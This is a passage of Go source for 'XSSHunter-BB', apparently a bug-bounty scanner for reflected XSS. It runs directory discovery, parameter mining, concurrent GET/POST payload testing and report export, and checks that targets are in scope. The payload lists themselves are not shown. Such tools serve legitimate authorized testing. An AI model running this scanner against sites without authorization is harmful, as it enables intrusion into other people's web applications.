			for _, payload := range payloadMap[level] {
				tasks = append(tasks, scanTask{rawURL, param, level, payload, "GET"})
				tasks = append(tasks, scanTask{rawURL, param, level, payload, "POST"})
			}
		}
	}

	u, _   := url.Parse(rawURL)
	path   := "/"
	if u != nil && u.Path != "" {
		path = u.Path
	}
	pb  := NewProgressBar(len(tasks), "testing payloads...", fYLW)
	sem := make(chan struct{}, x.concurrency)
	var wg sync.WaitGroup
	var found []Finding

	for _, t := range tasks {
		wg.Add(1)
		sem <- struct{}{}
		go func(task scanTask) {
			defer wg.Done()
			defer func() { <-sem }()
			var f *Finding
			if task.method == "GET" {
				f = x.testGET(task.rawURL, task.param, task.level, task.payload)
			} else {
				f = x.testPOST(task.rawURL, task.param, task.level, task.payload)
			}
			pb.Inc(truncate(path, 28))
			if f != nil {
				x.mu.Lock()
				x.findings = append(x.findings, *f)
				found = append(found, *f)
				x.mu.Unlock()
				x.log.Finding(f.Severity, f.Method, f.URL, f.Parameter, f.Level, f.Payload, f.Evidence)
			}
		}(t)
	}
	wg.Wait()
	pb.Done()
	return found
}

// ─────────────────────────────────────────────────────────────────────────────
// REPORT EXPORTER
// ─────────────────────────────────────────────────────────────────────────────
type Exporter struct {
	sess   *ScanSession
	outDir string
	base   string
}

func NewExporter(sess *ScanSession, outDir string) *Exporter {
	ts   := time.Now().Format("20060102_150405")
	u, _ := url.Parse(sess.Target)
	host := "unknown"
	if u != nil {
		host = strings.NewReplacer(":", "_", ".", "_").Replace(u.Hostname())
	}
	os.MkdirAll(outDir, 0755)
	return &Exporter{sess: sess, outDir: outDir, base: fmt.Sprintf("xss_%s_%s", host, ts)}
}

func (e *Exporter) JSON() string {
	path := filepath.Join(e.outDir, e.base+".json")
	b, _ := json.MarshalIndent(e.sess, "", "  ")
	os.WriteFile(path, b, 0644)
	return path
}

func (e *Exporter) HTML() string {
	path := filepath.Join(e.outDir, e.base+".html")
	f    := e.sess
	crit := countSev(f.Findings, "Critical")
	high := countSev(f.Findings, "High")
	med  := countSev(f.Findings, "Medium")

	sevColor := map[string]string{
		"Critical": "#ff4444", "High": "#ff8c00",
		"Medium": "#ffc107", "Low": "#4caf50",
	}
	statusMeta := map[int][3]string{
		200: {"#00e676", "✓ OPEN",      "rgba(0,230,118,0.08)"},
		301: {"#00e5ff", "→ REDIRECT",  "rgba(0,229,255,0.05)"},
		302: {"#00e5ff", "→ REDIRECT",  "rgba(0,229,255,0.05)"},
		401: {"#ffc107", "🔒 AUTH",     "rgba(255,193,7,0.05)"},
		403: {"#ff9800", "⚠ FORBIDDEN", "rgba(255,152,0,0.05)"},
		405: {"#ce93d8", "⚡ METHOD",   "rgba(206,147,216,0.05)"},
	}

	var findRows, findCards, dirRows strings.Builder
	for i, v := range f.Findings {
		c := sevColor[v.Severity]
		findRows.WriteString(fmt.Sprintf(`<tr>
		<td>%d</td><td><span class="badge" style="background:%s">%s</span></td>
		<td class="clip"><a href="%s">%s</a></td>
		<td><code>%s</code></td><td><code>%s</code></td>
		<td class="lvl">%s</td><td><code class="pay">%s</code></td><td>%s</td>
		</tr>`,
			i+1, c, v.Severity,
			html.EscapeString(v.URL), html.EscapeString(truncate(v.URL, 65)),
			html.EscapeString(v.Parameter), v.Method, v.Level,
			html.EscapeString(truncate(v.Payload, 50)), v.CWE))

		findCards.WriteString(fmt.Sprintf(`<div class="card">
		<div class="card-head" style="border-left:4px solid %s">
		  <span class="num">#%d</span>
		  <span class="badge" style="background:%s">%s</span>
		  <span class="card-title">Reflected XSS — <code>%s</code></span>
		</div>
		<div class="card-body">
		  <table class="dt">
		    <tr><th>URL</th><td><a href="%s">%s</a></td></tr>
		    <tr><th>Parameter</th><td><code>%s</code></td></tr>
		    <tr><th>Method</th><td><code>%s</code></td></tr>
		    <tr><th>Level</th><td>%s</td></tr>
		    <tr><th>Payload</th><td><code class="pay">%s</code></td></tr>
		    <tr><th>Evidence</th><td><code class="ev">%s</code></td></tr>
		    <tr><th>CWE / CVSS</th><td>%s / %s</td></tr>
		    <tr><th>Remediation</th><td>%s</td></tr>
		    <tr><th>Time</th><td>%s</td></tr>
		  </table>
		</div></div>`,
			c, i+1, c, v.Severity,
			html.EscapeString(v.Parameter),
			html.EscapeString(v.URL), html.EscapeString(v.URL),
			html.EscapeString(v.Parameter), v.Method, v.Level,
			html.EscapeString(v.Payload),
			html.EscapeString(truncate(v.Evidence, 350)),
			v.CWE, v.CVSS, v.Remediation, v.Timestamp))
	}

	for i, d := range f.DirsFound {
		meta, ok := statusMeta[d.Status]
		if !ok {
			meta = [3]string{"#888", strconv.Itoa(d.Status), "transparent"}
		}
		acc, uc, uw := "", "#00e5ff", "normal"
		if d.Status == 200 {
			acc = `<span style="color:#00e676;font-size:11px;font-weight:bold"> ◉ ACCESSIBLE</span>`
			uc  = "#00e676"
			uw  = "bold"
		}
		techs := ""
		for _, t := range d.Technologies {
			techs += fmt.Sprintf(`<span style="background:#1e1e1e;border:1px solid #333;padding:1px 6px;border-radius:3px;font-size:10px;color:#00e5ff;margin-right:3px">%s</span>`, t)
		}
		dirRows.WriteString(fmt.Sprintf(`<tr style="background:%s">
		<td style="color:#888">%d</td>
		<td><span style="background:%s;color:#000;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:bold">%s</span>
		    <span style="color:%s;font-size:11px;margin-left:5px">%d</span></td>
		<td><a href="%s" target="_blank" style="color:%s;font-weight:%s">%s</a>%s</td>
		<td style="color:#888">%s</td>
		<td style="color:#888;font-size:11px">%s</td>
		<td style="color:#ccc">%s</td>
		<td>%s</td></tr>`,
			meta[2], i+1,
			meta[0], meta[1], meta[0], d.Status,
			html.EscapeString(d.URL), uc, uw, html.EscapeString(d.URL), acc,
			humanSize(d.ContentLength),
			html.EscapeString(truncate(d.ContentType, 25)),
			html.EscapeString(d.Title), techs))
	}

	techTags, scopeTags := "", ""
	for _, t := range f.Technologies {
		techTags += fmt.Sprintf(`<span class="tag">%s</span>`, t)
	}
	for _, s := range f.Scope {
		scopeTags += fmt.Sprintf(`<span class="tag green">%s</span>`, s)
	}
	noF, noD := "", ""
	if len(f.Findings) == 0 {
		noF = `<p style="color:var(--gr);padding:16px 0">✓ No XSS vulnerabilities found.</p>`
	}
	if len(f.DirsFound) == 0 {
		noD = `<tr><td colspan="7" style="color:var(--tx2);text-align:center;padding:14px">None found</td></tr>`
	}
	wafColor := "var(--gr)"
	if f.WAFDetected != "" {
		wafColor = "var(--rd)"
	}

	page := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSSHunter-BB — %s</title>
<style>
:root{--bg:#0a0a0a;--s1:#111;--s2:#181818;--s3:#1e1e1e;--bd:#252525;
  --tx:#e0e0e0;--tx2:#777;--ac:#00e5ff;--gr:#00e676;--rd:#ff4444;
  --yw:#ffc107;--or:#ff8c00;--pu:#ce93d8}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--tx);font-family:'Courier New',monospace;font-size:13px;line-height:1.6}
a{color:var(--ac);text-decoration:none}a:hover{text-decoration:underline}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--s1)}
::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px}
header{background:linear-gradient(135deg,#0d1117 0%%,#111 100%%);
       border-bottom:1px solid var(--bd);padding:32px 48px;position:relative;overflow:hidden}
header::before{content:'';position:absolute;top:-50%%;left:-50%%;width:200%%;height:200%%;
  background:radial-gradient(ellipse at 60%% 50%%,rgba(0,229,255,0.04) 0%%,transparent 60%%);pointer-events:none}
header h1{color:var(--ac);font-size:22px;letter-spacing:5px;text-transform:uppercase;font-weight:bold}
header .sub{color:var(--tx2);font-size:11px;margin-top:10px;line-height:2}
header .sub strong{color:var(--tx)}
.wrap{max-width:1500px;margin:0 auto;padding:32px 48px}
h2{color:var(--ac);font-size:11px;letter-spacing:3px;text-transform:uppercase;
   padding-bottom:10px;margin:40px 0 18px;display:flex;align-items:center;gap:10px}
h2::after{content:'';flex:1;height:1px;background:var(--bd)}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:18px 0}
.box{background:var(--s1);border:1px solid var(--bd);border-radius:8px;padding:20px 16px;
     text-align:center;transition:border-color .2s}
.box:hover{border-color:#444}
.box .n{font-size:28px;font-weight:bold;color:var(--ac);font-variant-numeric:tabular-nums}
.box .l{color:var(--tx2);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin-top:5px}
.box.cr .n{color:var(--rd)}.box.hi .n{color:var(--or)}.box.me .n{color:var(--yw)}.box.ok .n{color:var(--gr)}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{background:var(--s3);color:var(--tx2);text-align:left;padding:10px 13px;
   font-size:10px;text-transform:uppercase;letter-spacing:1.2px;border-bottom:1px solid var(--bd)}
td{padding:9px 13px;border-bottom:1px solid var(--bd);vertical-align:top}
tr:hover td{background:rgba(255,255,255,0.02)}
.badge{display:inline-block;padding:2px 9px;border-radius:4px;
       font-size:10px;font-weight:bold;color:#000;letter-spacing:.8px}
code{background:var(--s3);padding:2px 7px;border-radius:4px;font-size:11px;color:var(--gr)}
.pay{color:#ff9800}.ev{color:var(--tx2);font-size:10px;word-break:break-all;white-space:pre-wrap;line-height:1.5}
.clip{max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lvl{color:var(--pu);font-size:11px}
.card{background:var(--s1);border:1px solid var(--bd);border-radius:8px;margin-bottom:14px;overflow:hidden;
      transition:border-color .2s}
.card:hover{border-color:#3a3a3a}
.card-head{padding:13px 20px;background:var(--s2);display:flex;align-items:center;gap:12px}
.num{color:var(--tx2);font-size:11px}.card-title{color:var(--tx)}
.card-body{padding:18px 20px}
.dt th{background:transparent;color:var(--tx2);width:120px;border:none;border-bottom:1px solid var(--bd);padding:7px 0}
.dt td{border:none;border-bottom:1px solid var(--bd);padding:7px 13px}
.tags{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0}
.tag{background:var(--s3);border:1px solid var(--bd);padding:3px 12px;border-radius:20px;font-size:11px;color:var(--ac)}
.tag.green{color:var(--gr)}
.warn{background:#130800;border:1px solid #3d1f00;border-radius:8px;
      padding:13px 20px;color:#ff9800;font-size:11px;margin:16px 0;display:flex;align-items:flex-start;gap:10px}
.footer{text-align:center;color:var(--tx2);font-size:11px;padding:48px 0 24px;
        border-top:1px solid var(--bd);margin-top:48px}
</style></head><body>
<header>
  <h1>⚡ XSSHunter-BB — Scan Report</h1>
  <div class="sub">
    <strong>Target:</strong> %s &nbsp;·&nbsp;
    <strong>Start:</strong> %s &nbsp;·&nbsp; <strong>End:</strong> %s<br>
    <strong>WAF:</strong> <span style="color:%s">%s</span> &nbsp;·&nbsp;
    <strong>Tech:</strong> %s
  </div>
</header>
<div class="wrap">
<div class="warn">⚠ This report is for authorized Bug Bounty / Penetration Testing only. Disclose responsibly via HackerOne / Bugcrowd / official VDP channels.</div>
<h2>Scope</h2><div class="tags">%s</div>
<h2>Executive Summary</h2>
<div class="grid">
  <div class="box cr"><div class="n">%d</div><div class="l">Critical</div></div>
  <div class="box hi"><div class="n">%d</div><div class="l">High</div></div>
  <div class="box me"><div class="n">%d</div><div class="l">Medium</div></div>
  <div class="box"><div class="n">%d</div><div class="l">Total Findings</div></div>
  <div class="box ok"><div class="n">%d</div><div class="l">Real Dirs</div></div>
  <div class="box"><div class="n">%d</div><div class="l">Params</div></div>
  <div class="box"><div class="n">%s</div><div class="l">Payloads Sent</div></div>
  <div class="box"><div class="n">%d</div><div class="l">URLs Tested</div></div>
</div>
<h2>Findings Overview</h2>
<table><thead><tr><th>#</th><th>Sev</th><th>URL</th><th>Param</th><th>Method</th><th>Level</th><th>Payload</th><th>CWE</th></tr></thead>
<tbody>%s%s</tbody></table>
<h2>Detailed Findings</h2>%s%s
<h2>Directories Discovered</h2>
<table><thead><tr><th>#</th><th>Status</th><th>URL</th><th>Size</th><th>Type</th><th>Title</th><th>Tech</th></tr></thead>
<tbody>%s%s</tbody></table>
<h2>Remediation</h2>
<table><thead><tr><th>Issue</th><th>Recommendation</th></tr></thead><tbody>
<tr><td>Reflected XSS</td><td>Context-aware output encoding. HTML entities for HTML context, JS escaping for script context.</td></tr>
<tr><td>DOM XSS</td><td>Use <code>textContent</code> not <code>innerHTML</code>. Avoid <code>eval()</code> with user data.</td></tr>
<tr><td>CSP Header</td><td><code>Content-Security-Policy: default-src 'self'; script-src 'self'</code></td></tr>
<tr><td>Input Validation</td><td>Server-side whitelist. Reject unexpected characters before processing.</td></tr>
<tr><td>HttpOnly Cookies</td><td>Set <code>HttpOnly</code> and <code>SameSite=Strict</code> on all session cookies.</td></tr>
</tbody></table>
</div>
<div class="footer">XSSHunter-BB Go v3.0 &nbsp;·&nbsp; %s &nbsp;·&nbsp; Authorized use only</div>
</body></html>`,
		html.EscapeString(f.Target),
		html.EscapeString(f.Target),
		f.StartTime[:19], f.EndTime[:19],
		wafColor, orDefault(f.WAFDetected, "Not detected"),
		techTags,
		scopeTags,
		crit, high, med, len(f.Findings),
		len(f.DirsFound), len(f.ParamsFound),
		humanNum(f.PayloadsSent), f.URLsTested,
		findRows.String(),
		func() string {
			if len(f.Findings) == 0 {
				return `<tr><td colspan="8" style="text-align:center;color:var(--gr);padding:18px">✓ No XSS vulnerabilities found</td></tr>`
			}
			return ""
		}(),
		findCards.String(), noF,
		dirRows.String(), noD,
		time.Now().Format("2006-01-02 15:04:05"),
	)
	os.WriteFile(path, []byte(page), 0644)
	return path
}

func (e *Exporter) Markdown() string {
	path := filepath.Join(e.outDir, e.base+".md")
	f    := e.sess
	var sb strings.Builder
	sb.WriteString("# XSSHunter-BB — Scan Report\n\n")
	sb.WriteString(fmt.Sprintf("> **Target:** %s  \n> **Scope:** %s  \n> **WAF:** %s  \n> **Tech:** %s  \n\n---\n\n",
		f.Target, strings.Join(f.Scope, ", "),
		orDefault(f.WAFDetected, "None"), strings.Join(f.Technologies, ", ")))
	sb.WriteString("## Summary\n\n| Metric | Value |\n|--------|-------|\n")
	sb.WriteString(fmt.Sprintf("| Findings | **%d** |\n| Critical | %d |\n| High | %d |\n| Medium | %d |\n",
		len(f.Findings), countSev(f.Findings, "Critical"), countSev(f.Findings, "High"), countSev(f.Findings, "Medium")))
	sb.WriteString(fmt.Sprintf("| Dirs Found | %d |\n| Params Found | %d |\n| Payloads Sent | %d |\n\n---\n\n",
		len(f.DirsFound), len(f.ParamsFound), f.PayloadsSent))
	for i, v := range f.Findings {
		sb.WriteString(fmt.Sprintf("### #%d — %s — `%s`\n\n", i+1, v.Severity, v.Parameter))
		sb.WriteString(fmt.Sprintf("- **URL:** `%s`\n- **Method:** `%s`\n- **Payload:** `%s`\n- **CWE:** %s\n\n```\n%s\n```\n\n", v.URL, v.Method, v.Payload, v.CWE, v.Evidence))
	}
	os.WriteFile(path, []byte(sb.String()), 0644)
	return path
}

// ─────────────────────────────────────────────────────────────────────────────
// BANNER
// ─────────────────────────────────────────────────────────────────────────────
func printBanner() {
	fmt.Print(hidCur)
	lines := []string{
		fCYN + BLD + "  ██╗  ██╗███████╗███████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ " + RST,
		fCYN + BLD + "  ╚██╗██╔╝██╔════╝██╔════╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗" + RST,
		fCYN + BLD + "   ╚███╔╝ ███████╗███████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝" + RST,
		fCYN + BLD + "   ██╔██╗ ╚════██║╚════██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗" + RST,
		fCYN + BLD + "  ██╔╝ ██╗███████║███████║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║" + RST,
		fCYN + BLD + "  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝" + RST,
	}
	fmt.Println()
	for _, line := range lines {
		fmt.Println(line)
		time.Sleep(35 * time.Millisecond)
	}
	fmt.Println()
	fmt.Println(boxTop(fCYN))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  %s  XSS Bug Bounty Scanner%s  %s v3.0 — Go Edition%s", fYLW+BLD, RST, fGRY, RST)))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  %sAccurate 200 · Soft-404 · Recursive Dir · Param Mining · Reports%s", DIM+fWHT, RST)))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  %s⚠  Authorized targets only — Bug Bounty / Ethical Pentesting%s", fRED, RST)))
	fmt.Println(boxBot(fCYN))
	fmt.Println()
	fmt.Print(shwCur)
}

// ─────────────────────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────────────────────
func truncate(s string, n int) string {
	r := []rune(s)
	if len(r) <= n { return s }
	return string(r[:n])
}
func min(a, b int) int { if a < b { return a }; return b }
func max(a, b int) int { if a > b { return a }; return b }
func abs(n int) int    { if n < 0 { return -n }; return n }
func countSev(ff []Finding, s string) int {
	n := 0; for _, f := range ff { if f.Severity == s { n++ } }; return n
}
func orDefault(s, d string) string { if s == "" { return d }; return s }
func humanSize(n int) string {
	switch { case n >= 1<<20: return fmt.Sprintf("%.1fMB", float64(n)/(1<<20))
	case n >= 1<<10: return fmt.Sprintf("%.1fKB", float64(n)/(1<<10))
	default: return fmt.Sprintf("%dB", n) }
}
func humanNum(n int64) string {
	if n >= 1000 { return fmt.Sprintf("%.1fK", float64(n)/1000) }
	return strconv.FormatInt(n, 10)
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────────────────────
func main() {
	targetURL   := flag.String("u", "",    "Target URL (required)")
	scopeStr    := flag.String("s", "",    "Scope domains comma-separated (required)")
	levelsStr   := flag.String("l", "level1_basic,level2_attribute,level3_encoded", "Payload levels")
	concurrency := flag.Int("c", 50,       "Concurrent goroutines")
	timeoutSec  := flag.Int("t", 8,        "Timeout seconds")
	outputDir   := flag.String("o", "reports", "Output directory")
	allLevels   := flag.Bool("all-levels", false, "All 6 payload levels")
	skipDirs    := flag.Bool("skip-dirs",  false, "Skip dir discovery")
	skipParams  := flag.Bool("skip-params",false, "Skip param mining")
	noRecursive := flag.Bool("no-recursive",false,"Disable recursive scan")
	maxDepth    := flag.Int("depth", 2,    "Recursive depth")
	headersStr  := flag.String("headers",  "",    `Custom headers JSON`)
	verbose     := flag.Bool("v", false,   "Verbose output")
	flag.Parse()

	printBanner()

	if *targetURL == "" || *scopeStr == "" {
		fmt.Println(red("  ✖ -u (target) and -s (scope) are required"))
		fmt.Println(gry("    Usage: go run xss.go -u https://target.com -s target.com"))
		fmt.Println()
		os.Exit(1)
	}

	log   := &Logger{verbose: *verbose}
	scope := NewScope(*scopeStr)

	if !scope.InScope(*targetURL) {
		log.Error("Target is OUT OF SCOPE — aborting.")
		os.Exit(1)
	}

	var levels []string
	if *allLevels {
		for k := range payloadMap { levels = append(levels, k) }
		sort.Strings(levels)
	} else {
		for _, l := range strings.Split(*levelsStr, ",") {
			if l = strings.TrimSpace(l); l != "" { levels = append(levels, l) }
		}
	}

	customHeaders := map[string]string{}
	if *headersStr != "" {
		if err := json.Unmarshal([]byte(*headersStr), &customHeaders); err != nil {
			log.Warn("Could not parse --headers JSON, ignoring.")
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n\n" + ylw("  ⚠ Interrupted — generating partial report..."))
		cancel()
	}()
	_ = ctx

	client := newClient(*timeoutSec)

	fmt.Println(boxTop(fGRY))
	fmt.Println(boxLine(fGRY, fmt.Sprintf("  Target   %s", cyn(*targetURL))))
	fmt.Println(boxLine(fGRY, fmt.Sprintf("  Scope    %s", grn(*scopeStr))))
	fmt.Println(boxLine(fGRY, fmt.Sprintf("  Levels   %s", ylw(strings.Join(levels, " · ")))))
	fmt.Println(boxLine(fGRY, fmt.Sprintf("  Workers  %s  ·  Timeout %ss", bld(strconv.Itoa(*concurrency)), strconv.Itoa(*timeoutSec))))
	fmt.Println(boxBot(fGRY))
	fmt.Println()

	sess := &ScanSession{
		Tool: "XSSHunter-BB", Version: "3.0.0",
		Target: *targetURL, Scope: strings.Split(*scopeStr, ","),
		StartTime: time.Now().Format(time.RFC3339),
	}

	sp := NewSpinner("Connecting to target...", fCYN)
	sp.Start()
	status, body, headers, err := doGet(client, *targetURL, customHeaders)
	if err != nil {
		sp.Stop("")
		log.Error("Cannot reach target: " + err.Error())
		os.Exit(1)
	}
	sess.Technologies = detectTech(headers, body)
	sess.WAFDetected  = detectWAF(headers, body, status)
	sp.Stop(fmt.Sprintf("  %s Connected  [%d]  %s", grn("✔"), status, cyn(*targetURL)))

	if len(sess.Technologies) > 0 {
		log.Info("Technologies : " + grn(strings.Join(sess.Technologies, " · ")))
	}
	if sess.WAFDetected != "" {
		log.Warn("WAF Detected : " + red(sess.WAFDetected))
	}

	allURLs := []string{*targetURL}
	soft404 := NewSoft404()

	if !*skipDirs {
		log.Phase(1, "Directory Discovery")
		disc := &DirDiscovery{
			client: client, scope: scope, log: log,
			soft404: soft404, concurrency: *concurrency, headers: customHeaders,
		}
		dep := 0
		if !*noRecursive { dep = *maxDepth }
		results := disc.Run(*targetURL, wordlist, 0, dep, log)
		sess.DirsFound = results
		for _, r := range results {
			if r.IsReal { allURLs = append(allURLs, r.URL) }
		}
		log.Success(fmt.Sprintf("Found %s real paths (soft-404 filtered)", bld(strconv.Itoa(len(results)))))
	}

	allParams := map[string]bool{}
	if !*skipParams {
		log.Phase(2, "Parameter Mining")
		miner := &ParamMiner{
			client: client, scope: scope, log: log,
			concurrency: *concurrency,
			probeVal:    fmt.Sprintf("XSSHUNTER%d", time.Now().UnixNano()),
			headers:     customHeaders,
		}
		for _, u := range allURLs[:min(8, len(allURLs))] {
			log.Info("Mining params on " + cyn(u))
			for _, p := range miner.Run(u, commonParams) { allParams[p] = true }
			if _, b, _, e := doGet(client, u, customHeaders); e == nil {
				for _, p := range extractParamsFromHTML(b, u) { allParams[p] = true }
			}
		}
		pList := make([]string, 0, len(allParams))
		for p := range allParams { pList = append(pList, p) }
		sess.ParamsFound = pList
		log.Success(fmt.Sprintf("Found %s parameters", bld(strconv.Itoa(len(pList)))))
	}

	log.Phase(3, "XSS Scanning")
	xss := &XSSScanner{
		client: client, scope: scope, log: log,
		levels: levels, concurrency: *concurrency, headers: customHeaders,
	}
	params := sess.ParamsFound
	if len(params) == 0 { params = commonParams[:25] }

	for i, u := range allURLs {
		totalTests := len(params) * func() int {
			n := 0
			for _, lvl := range levels { n += len(payloadMap[lvl]) }
			return n * 2
		}()
		log.Info(fmt.Sprintf("[%d/%d] %s  %s%d params × %d tests%s",
			i+1, len(allURLs), cyn(u), fGRY, len(params), totalTests, RST))
		xss.Scan(u, params)
		sess.URLsTested++
	}

	sess.Findings     = xss.findings
	sess.PayloadsSent = atomic.LoadInt64(&xss.sent)
	sess.RequestsMade = atomic.LoadInt64(&xss.sent)
	sess.EndTime      = time.Now().Format(time.RFC3339)

	log.Phase(4, "Exporting Reports")
	sp2 := NewSpinner("Generating HTML report...", fGRN)
	sp2.Start()
	exp      := NewExporter(sess, *outputDir)
	jsonPath := exp.JSON()
	htmlPath := exp.HTML()
	mdPath   := exp.Markdown()
	sp2.Stop(grn("  ✔ Reports saved"))

	crit := countSev(sess.Findings, "Critical")
	high := countSev(sess.Findings, "High")
	med  := countSev(sess.Findings, "Medium")

	fmt.Println()
	fmt.Println(boxTop(fCYN))
	fmt.Println(boxLine(fCYN, BLD+fCYN+"  SCAN COMPLETE"+RST))
	fmt.Println(boxMid(fCYN))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  Target          %s", cyn(*targetURL))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  WAF             %s", func() string {
		if sess.WAFDetected != "" { return red(sess.WAFDetected) }
		return grn("None detected")
	}())))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  Technologies    %s", ylw(orDefault(strings.Join(sess.Technologies, " · "), "Unknown")))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  Real Dirs Found %s", grn(strconv.Itoa(len(sess.DirsFound))))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  Params Found    %s", grn(strconv.Itoa(len(sess.ParamsFound))))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  URLs Tested     %s", wht(strconv.Itoa(sess.URLsTested)))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  Payloads Sent   %s", wht(humanNum(sess.PayloadsSent)))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  XSS Findings    %s  %s%d Crit%s  %s%d High%s  %s%d Med%s",
		mag(bld(strconv.Itoa(len(sess.Findings)))),
		fRED, crit, RST, fYLW, high, RST, fCYN, med, RST)))
	fmt.Println(boxMid(fCYN))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  HTML  %s", grn(htmlPath))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  JSON  %s", grn(jsonPath))))
	fmt.Println(boxLine(fCYN, fmt.Sprintf("  MD    %s", grn(mdPath))))
	fmt.Println(boxBot(fCYN))
	fmt.Println()

	select {
	case <-ctx.Done():
	default:
	}
}
